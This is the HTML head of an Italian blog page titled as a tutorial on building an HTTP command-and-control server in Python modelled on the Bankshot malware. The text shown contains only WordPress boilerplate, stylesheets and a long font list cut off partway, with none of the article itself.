<!DOCTYPE html>
<html lang="it-IT" >
		<head>
			<meta charset="UTF-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
			<link rel="pingback" href=" https://malverse.it/xmlrpc.php ">		<title>Realizziamo un HTTP C&#038;C in Python (Bankshot) &#8211; Malverse</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Malverse &raquo; Feed" href="https://malverse.it/feed" />
<link rel="alternate" type="application/rss+xml" title="Malverse &raquo; Feed dei commenti" href="https://malverse.it/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Malverse &raquo; Realizziamo un HTTP C&#038;C in Python (Bankshot) Feed dei commenti" href="https://malverse.it/analisi-bankshot-copperhedge/feed" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/malverse.it\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://malverse.it/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='spice-social-share-font-awesome-css' href='https://malverse.it/wp-content/plugins/spice-social-share/assets/css/font-awesome/css/all.min.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='spice-social-share-custom-css' href='https://malverse.it/wp-content/plugins/spice-social-share/assets/css/custom.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://malverse.it/wp-content/themes/honeypress/assets/css/bootstrap.min.css?ver=4.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='honeypress-dark-parent-style-css' href='https://malverse.it/wp-content/themes/honeypress/style.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='honeypress-dark-default-style-css' href='https://malverse.it/wp-content/themes/honeypress-dark/assets/css/default.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='honeypress-style-css' href='https://malverse.it/wp-content/themes/honeypress-dark/style.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-startmenu-css' href='https://malverse.it/wp-content/themes/honeypress/assets/css/jquery.smartmenus.bootstrap-4.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='honeypress-font-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C700%2C700i%2C800%2C800i&#038;ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css' href='https://malverse.it/wp-content/themes/honeypress/assets/css/font-awesome/css/font-awesome.min.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='owl-css' href='https://malverse.it/wp-content/themes/honeypress/assets/css/owl.carousel.css?ver=6.7.1' type='text/css' media='all' />
<link rel='stylesheet' id='honeypress-google-fonts-css' href='//fonts.googleapis.com/css?family=ABeeZee%7CAbel%7CAbril+Fatface%7CAclonica%7CAcme%7CActor%7CAdamina%7CAdvent+Pro%7CAguafina+Script%7CAkronim%7CAladin%7CAldrich%7CAlef%7CAlegreya%7CAlegreya+SC%7CAlegreya+Sans%7CAlegreya+Sans+SC%7CAlex+Brush%7CAlfa+Slab+One%7CAlice%7CAlike%7CAlike+Angular%7CAllan%7CAllerta%7CAllerta+Stencil%7CAllura%7CAlmendra%7CAlmendra+Display%7CAlmendra+SC%7CAmarante%7CAmaranth%7CAmatic+SC%7CAmatica+SC%7CAmethysta%7CAmiko%7CAmiri%7CAmita%7CAnaheim%7CAndada%7CAndika%7CAngkor%7CAnnie+Use+Your+Telescope%7CAnonymous+Pro%7CAntic%7CAntic+Didone%7CAntic+Slab%7CAnton%7CArapey%7CArbutus%7CArbutus+Slab%7CArchitects+Daughter%7CArchivo+Black%7CArchivo+Narrow%7CAref+Ruqaa%7CArima+Madurai%7CArimo%7CArizonia%7CArmata%7CArtifika%7CArvo%7CArya%7CAsap%7CAsar%7CAsset%7CAssistant%7CAstloch%7CAsul%7CAthiti%7CAtma%7CAtomic+Age%7CAubrey%7CAudiowide%7CAutour+One%7CAverage%7CAverage+Sans%7CAveria+Gruesa+Libre%7CAveria+Libre%7CAveria+Sans+Libre%7CAveria+Serif+Libre%7CBad+Script%7CBaloo%7CBaloo+Bhai%7CBaloo+Da%7CBaloo+Thambi%7CBalthazar%7CBangers%7CBasic%7CBattambang%7CBaumans%7CBayon%7CBelgrano%7CBelleza%7CBenchNine%7CBentham%7CBerkshire+Swash%7CBevan%7CBigelow+Rules%7CBigshot+One%7CBilbo%7CBilbo+Swash+Caps%7CBioRhyme%7CBioRhyme+Expanded%7CBiryani%7CBitter%7CBlack+Ops+One%7CBokor%7CBonbon%7CBoogaloo%7CBowlby+One%7CBowlby+One+SC%7CBrawler%7CBree+Serif%7CBubblegum+Sans%7CBubbler+One%7CBuda%7CBuenard%7CBungee%7CBungee+Hairline%7CBungee+Inline%7CBungee+Outline%7CBungee+Shade%7CButcherman%7CButterfly+Kids%7CCabin%7CCabin+Condensed%7CCabin+Sketch%7CCaesar+Dressing%7CCagliostro%7CCairo%7CCalligraffitti%7CCambay%7CCambo%7CCandal%7CCantarell%7CCantata+One%7CCantora+One%7CCapriola%7CCardo%7CCarme%7CCarrois+Gothic%7CCarrois+Gothic+SC%7CCarter+One%7CCatamaran%7CCaudex%7CCaveat%7CCaveat+Brush%7CCedarville+Cursive%7CCeviche+One%7CChanga%7CChanga+One%7CChango%7CChathura%7CChau+Philomene+One%7CChela+One%7CChelsea+Market%7CChenla%7CCherry+Cream+Soda%7CCherry+Swash%7CChewy%7CChicle%7CChivo%7CChonburi%7CCinzel%7CCinzel+Decorative%7CClicker+Script%7CCoda%7CCoda+Caption%7CCodystar%7CCoiny%7CCombo%7CComfortaa%7CComing+Soon%7CConcert+One%7CCondiment%7CContent%7CContrail+One%7CConvergence%7CCookie%7CCopse%7CCorben%7CCormorant%7CCormorant+Garamond%7CCormorant+Infant%7CCormorant+SC%7CCormorant+Unicase%7CCormorant+Upright%7CCourgette%7CCousine%7CCoustard%7CCovered+By+Your+Grace%7CCrafty+Girls%7CCreepster%7CCrete+Round%7CCrimson+Text%7CCroissant+One%7CCrushed%7CCuprum%7CCutive%7CCutive+Mono%7CDamion%7CDancing+Script%7CDangrek%7CDavid+Libre%7CDawning+of+a+New+Day%7CDays+One%7CDekko%7CDelius%7CDelius+Swash+Caps%7CDelius+Unicase%7CDella+Respira%7CDenk+One%7CDevonshire%7CDhurjati%7CDidact+Gothic%7CDiplomata%7CDiplomata+SC%7CDomine%7CDonegal+One%7CDoppio+One%7CDorsa%7CDosis%7CDr+Sugiyama%7CDroid+Sans%7CDroid+Sans+Mono%7CDroid+Serif%7CDuru+Sans%7CDynalight%7CEB+Garamond%7CEagle+Lake%7CEater%7CEconomica%7CEczar%7CEk+Mukta%7CEl+Messiri%7CElectrolize%7CElsie%7CElsie+Swash+Caps%7CEmblema+One%7CEmilys+Candy%7CEngagement%7CEnglebert%7CEnriqueta%7CErica+One%7CEsteban%7CEuphoria+Script%7CEwert%7CExo%7CExo+2%7CExpletus+Sans%7CFanwood+Text%7CFarsan%7CFascinate%7CFascinate+Inline%7CFaster+One%7CFasthand%7CFauna+One%7CFederant%7CFedero%7CFelipa%7CFenix%7CFinger+Paint%7CFira+Mono%7CFira+Sans%7CFjalla+One%7CFjord+One%7CFlamenco%7CFlavors%7CFondamento%7CFontdiner+Swanky%7CForum%7CFrancois+One%7CFrank+Ruhl+Libre%7CFreckle+Face%7CFredericka+the+Great%7CFredoka+One%7CFreehand%7CFresca%7CFrijole%7CFruktur%7CFugaz+One%7CGFS+Didot%7CGFS+Neohellenic%7CGabriela%7CGafata%7CGalada%7CGaldeano%7CGalindo%7CGentium+Basic%7CGentium+Book+Basic%7CGeo%7CGeostar%7CGeostar+Fill%7CGermania+One%7CGidugu%7CGilda+Display%7CGive+You+Glory%7CGlass+Antiqua%7CGlegoo%7CGloria+Hallelujah%7CGoblin+One%7CGochi+Hand%7CGorditas%7CGoudy+Bookletter+1911%7CGraduate%7CGrand+Hotel%7CGravitas+One%7CGreat+Vibes%7CGriffy%7CGruppo%7CGudea%7CGurajada%7CHabibi%7CHalant%7CHammersmith+One%7CHanalei%7CHanalei+Fill%7CHandlee%7CHanuman%7CHappy+Monkey%7CHarmattan%7CHeadland+One%7CHeebo%7CHenny+Penny%7CHerr+Von+Muellerhoff%7CHind%7CHind+Guntur%7CHind+Madurai%7CHind+Siliguri%7CHind+Vadodara%7CHoltwood+One+SC%7CHomemade+Apple%7CHomenaje%7CIM+Fell+DW+Pica%7CIM+Fell+DW+Pica+SC%7CIM+Fell+Double+Pica%7CIM+Fell+Double+Pica+SC%7CIM+Fell+English%7CIM+Fell+English+SC%7CIM+Fell+French+Canon%7CIM+Fell+French+Canon+SC%7CIM+Fell+Great+Primer%7CIM+Fell+Great+Primer+SC%7CIceberg%7CIceland%7CImprima%7CInconsolata%7CInder%7CIndie+Flower%7CInika%7CInknut+Antiqua%7CIrish+Grover%7CIstok+Web%7CItaliana%7CItalianno%7CItim%7CJacques+Francois%7CJacques+Francois+Shadow%7CJaldi%7CJim+Nightshade%7CJockey+One%7CJolly+Lodger%7CJomhuria%7CJosefin+Sans%7CJosefin+Slab%7CJoti+One%7CJudson%7CJulee%7CJulius+Sans+One%7CJunge%7CJura%7CJust+Another+Hand%7CJust+Me+Again+Down+Here%7CKadwa%7CKalam%7CKameron%7CKanit%7CKantumruy%7CKarla%7CKarma%7CKatibeh%7CKaushan+Script%7CKavivanar%7CKavoon%7CKdam+Thmor%7CKeania+One%7CKelly+Slab%7CKenia%7CKhand%7CKhmer%7CKhula%7CKite+One%7CKnewave%7CKotta+One%7CKoulen%7CKranky%7CKreon%7CKristi%7CKrona+One%7CKumar+One%7CKumar+One+Outline%7CKurale%7CLa+Belle+Aurore%7CLaila%7CLakki+Reddy%7CLalezar%7CLancelot%7CLateef%7CLato%7CLeague+Script%7CLeckerli+One%7CLedger%7CLekton%7CLemon%7CLemonada%7CLibre+Baskerville%7CLibre+Franklin%7CLife+Savers%7CLilita+One%7CLily+Script+One%7CLimelight%7CLinden+Hill%7CLobster%7CLobster+Two%7CLondrina+Outline%7CLondrina+Shadow%7CLondrina+Sketch%7CLondrina+Solid%7CLora%7CLove+Ya+Like+A+Sister%7CLoved+by+the+King%7CLovers+Quarrel%7CLuckiest+Guy%7CLusitana%7CLustria%7CMacondo%7CMacondo+Swash+Caps%7CMada%7CMagra%7CMaiden+Orange%7CMaitree%7CMako%7CMallanna%7CMandali%7CMarcellus%7CMarcellus+SC%7CMarck+Script%7CMargarine%7CMarko+One%7CMarmelad%7CMartel%7CMartel+Sans%7CMarvel%7CMate%7CMate+SC%7CMaven+Pro%7CMcLaren%7CMeddon%7CMedievalSharp%7CMedula+One%7CMeera+Inimai%7CMegrim%7CMeie+Script%7CMerienda%7CMerienda+One%7CMerriweather%7CMerriweather+Sans%7CMetal%7CMetal+Mania%7CMetamorphous%7CMetrophobic%7CMichroma%7CMilonga%7CMiltonian%7CMiltonian+Tattoo%7CMiniver%7CMiriam+Libre%7CMirza%7CMiss+Fajardose%7CMitr%7CModak%7CModern+Antiqua%7CMogra%7CMolengo%7CMolle%7CMonda%7CMonofett%7CMonoton%7CMonsieur+La+Doulaise%7CMontaga%7CMontez%7CMontserrat%7CMontserrat+Alternates%7CMontserrat+Subrayada%7CMoul%7CMoulpali%7CMountains+of+Christmas%7CMouse+Memoirs%7CMr+Bedfort%7CMr+Dafoe%7CMr+De+Haviland%7CMrs+Saint+Delafield%7CMrs+Sheppards%7CMukta+Vaani%7CMuli%7CMystery+Quest%7CNTR%7CNeucha%7CNeuton%7CNew+Rocker%7CNews+Cycle%7CNiconne%7CNixie+One%7CNobile%7CNokora%7CNorican%7CNosifer%7CNothing+You+Could+Do%7CNoticia+Text%7CNoto+Sans%7CNoto+Serif%7CNova+Cut%7CNova+Flat%7CNova+Mono%7CNova+Oval%7CNova+Round%7CNova+Script%7CNova+Slim%7CNova+Square%7CNumans%7CNunito%7COdor+Mean+Chey%7COffside%7COld+Standard+TT%7COldenburg%7COleo+Script%7COleo+Script+Swash+Caps%7COpen+Sans%7COpen+Sans+Condensed%7COranienbaum%7COrbitron%7COregano%7COrienta%7COriginal+Surfer%7COswald%7COver+the+Rainbow%7COverlock%7COverlock+SC%7COvo%7COxygen%7COxygen+Mono%7CPT+Mono%7CPT+Sans%7CPT+Sans+Caption%7CPT+Sans+Narrow%7CPT+Serif%7CPT+Serif+Caption%7CPacifico%7CPalanquin%7CPalanquin+Dark%7CPaprika%7CParisienne%7CPassero+One%7CPassion+One%7CPathway+Gothic+One%7CPatrick+Hand%7CPatrick+Hand+SC%7CPattaya%7CPatua+One%7CPavanam%7CPaytone+One%7CPeddana%7CPeralta%7CPermanent+Marker%7CPetit+Formal+Script%7CPetrona%7CPhilosopher%7CPiedra%7CPinyon+Script%7CPirata+One%7CPlaster%7CPlay%7CPlayball%7CPlayfair+Display%7CPlayfair+Display+SC%7CPodkova%7CPoiret+One%7CPoller+One%7CPoly%7CPompiere%7CPontano+Sans%7CPoppins%7CPort+Lligat+Sans%7CPort+Lligat+Slab%7CPragati+Narrow%7CPrata%7CPreahvihear%7CPress+Start+2P%7CPridi%7CPrincess+Sofia%7CProciono%7CPrompt%7CProsto+One%7CProza+Libre%7CPuritan%7CPurple+Purse%7CQuando%7CQuantico%7CQuattrocento%7CQuattrocento+Sans%7CQuestrial%7CQuicksand%7CQuintessential%7CQwigley%7CRacing+Sans+One%7CRadley%7CRajdhani%7CRakkas%7CRaleway%7CRaleway+Dots%7CRamabhadra%7CRamaraja%7CRambla%7CRammetto+One%7CRanchers%7CRancho%7CRanga%7CRasa%7CRationale%7CRedressed%7CReem+Kufi%7CReenie+Beanie%7CRevalia%7CRhodium+Libre%7CRibeye%7CRibeye+Marrow%7CRighteous%7CRisque%7CRoboto%7CRoboto+Condensed%7CRoboto+Mono%7CRoboto+Slab%7CRochester%7CRock+Salt%7CRokkitt%7CRomanesco%7CRopa+Sans%7CRosario%7CRosarivo%7CRouge+Script%7CRozha+One%7CRubik%7CRubik+Mono+One%7CRubik+One%7CRuda%7CRufina%7CRuge+Boogie%7CRuluko%7CRum+Raisin%7CRuslan+Display%7CRusso+One+%3D%3E+Russo+One%7CRuthie%7CRye%7CSacramento%7CSahitya%7CSail%7CSalsa%7CSanchez%7CSancreek%7CSansita+One%7CSarala%7CSarina%7CSarpanch%7CSatisfy%7CScada%7CScheherazade%7CSchoolbell%7CScope+One%7CSeaweed+Script%7CSecular+One%7CSevillana%7CSeymour+One%7CShadows+Into+Light%7CShadows+Into+Light+Two%7CShanti%7CShare%7CShare+Tech%7CShare+Tech+Mono%7CShojumaru%7CShort+Stack%7CShrikhand%7CSiemreap%7CSigmar+One%7CSignika%7CSignika+Negative%7CSimonetta%7CSintony%7CSirin+Stencil%7CSix+Caps%7CSkranji%7CSlabo+13px%7CSlabo+27px%7CSlackey%7CSmokum%7CSmythe%7CSniglet%7CSnippet%7CSnowburst+One%7CSofadi+One%7CSofia%7CSonsie+One%7CSorts+Mill+Goudy%7CSource+Code+Pro%7CSource+Sans+Pro%7CSource+Serif+Pro%7CSpace+Mono%7CSpecial+Elite%7CSpicy+Rice%7CSpinnaker%7CSpirax%7CSquada+One%7CSree+Krushnadevaraya%7CSriracha%7CStalemate%7CStalinist+One%7CStardos+Stencil%7CStint+Ultra+Condensed%7CStint+Ultra+Expanded%7CStoke%7CStrait%7CSue+Ellen+Francisco%7CSuez+One%7CSumana%7CSunshiney%7CSupermercado+One%7CSura%7CSuranna%7CSuravaram%7CSuwannaphum%7CSwanky+and+Moo+Moo%7CSyncopate%7CTangerine%7CTaprom%7CTauri%7CTaviraj%7CTeko%7CTelex%7CTenali+Ramakrishna%7CTenor+Sans%7CText+Me+One%7CThe+Girl+Next+Door%7CTienne%7CTillana%7CTimmana%7CTinos%7CTitan+One%7CTitillium+Web%7CTrade+Winds%7CTrirong%7CTrocchi%7CTrochut%7CTrykker%7CTulpen+One%7CUbuntu%7CUbuntu+Condensed%7CUbuntu+Mono%7CUltra%7CUncial+Antiqua%7CUnderdog%7CUnica+One%7CUnifrakturCook%7CUnifrakturMaguntia%7CUnkempt%7CUnlock%7CUnna%7CVT323%7CVampiro+One%7CVarela%7CVarela+Round%7CVast+Shadow%7CVesper+Libre%7CVibur%7CVidaloka%7CViga%7CVoces%7CVolkhov%7CVollkorn%7CVoltaire%7CWaiting+for+the+Sunrise%7CWallpoet%7CWalter+Turncoat%7CWarnes%7CWellfleet%7CWendy+One%7CWire+One%7CWork+Sans%7CYanone+Kaffeesatz%7CYantramanav%7CYatra+One%7CYellowtail%7CYeseva